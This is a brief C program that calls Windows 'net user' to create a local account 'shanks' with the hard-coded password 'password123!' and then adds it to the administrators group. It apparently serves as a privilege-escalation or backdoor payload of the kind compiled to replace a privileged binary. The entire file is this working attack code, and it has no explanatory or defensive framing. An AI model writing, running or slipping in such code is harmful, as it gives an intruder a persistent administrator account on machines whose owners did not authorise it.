#include <stdlib.h>
#include <stdio.h>

int main() {
    int status;

    // Adding user 'shanks' with a password
    status = system("net user shanks password123! /add");
    if (status != 0) {
        fprintf(stderr, "Failed to add user 'shanks'. Error code: %d\n", status);
        return 1; // Exit if user creation fails
    }

    // Adding 'shanks' to the administrators group
    status = system("net localgroup administrators shanks /add");
    if (status != 0) {
        fprintf(stderr, "Failed to add 'shanks' to administrators group. Error code: %d\n", status);
        // Optional
        system("net user shanks /delete");
        return 1;
    }

    printf("User 'shanks' added to administrators group successfully.\n");
    return 0;
}
